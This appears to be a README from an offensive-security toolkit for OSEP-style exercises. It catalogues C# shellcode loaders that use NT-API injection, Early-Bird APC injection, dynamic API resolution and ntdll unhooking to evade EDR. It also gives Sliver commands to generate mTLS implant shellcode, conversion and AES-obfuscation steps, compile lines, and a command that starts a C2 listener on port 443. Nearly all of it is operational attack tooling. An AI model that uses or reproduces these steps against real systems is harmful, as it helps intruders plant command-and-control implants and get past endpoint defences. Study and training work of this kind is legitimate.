# C# Injection Loaders (OSEP technique coverage)

Additional single-file C# loaders for the injection techniques the `aes-loaders/`
directory doesn't cover. All are self-contained and compile with `csc` or in
Visual Studio (Release, x64).

| File | Technique |
|---|---|
| `nt-injection.cs` | `NtAllocateVirtualMemory` + `NtWriteVirtualMemory` + `NtCreateThreadEx` (no `VirtualAllocEx`/`CreateRemoteThread`) |
| `apc-injection.cs` | Early-Bird APC injection — `QueueUserAPC` into a suspended process |
| `dinvoke-runner.cs` | Dynamic API resolution (DInvoke-style) — resolves Win32 APIs at runtime via `GetModuleHandle`/`GetProcAddress`, no static P/Invoke IAT entries |
| `ntdll-unhook.cs` | ntdll `.text` unhooking — overwrites hooked EDR stubs with a fresh copy from `\KnownDLLs` |

## Shellcode

These loaders take **raw** shellcode. Generate it as a C# array directly:

```bash
sliver > generate --mtls <IP>:<PORT> --format csharp --save /tmp/sc.cs   # paste byte[] into `buf`
```

Or generate raw shellcode and convert (incl. VBA `Array(...)`) — run from the
`osep-tools` repo root:

```bash
sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/sc.bin
python3 sliver/sliver2arrays.py /tmp/sc.bin --csharp
python3 sliver/sliver2arrays.py /tmp/sc.bin --vba
```

To keep the payload off disk/static scanners, pipe the C# array through the AES
encryptor (`../aes-loaders/aes-shellcode-encryption/`) and adapt the loader's
decryption step — the injection primitive (Nt*/APC) is unchanged.

## Compile

```powershell
# Windows (any of these)
csc /target:exe /platform:x64 /optimize+ /out:nt-injection.exe nt-injection.cs
csc /target:exe /platform:x64 /optimize+ /out:apc-injection.exe apc-injection.cs
csc /target:exe /platform:x64 /optimize+ /out:dinvoke-runner.exe dinvoke-runner.cs
csc /target:exe /platform:x64 /optimize+ /out:ntdll-unhook.exe ntdll-unhook.cs
```

## Listener

```bash
sliver > mtls --lhost <IP> --lport 443
```
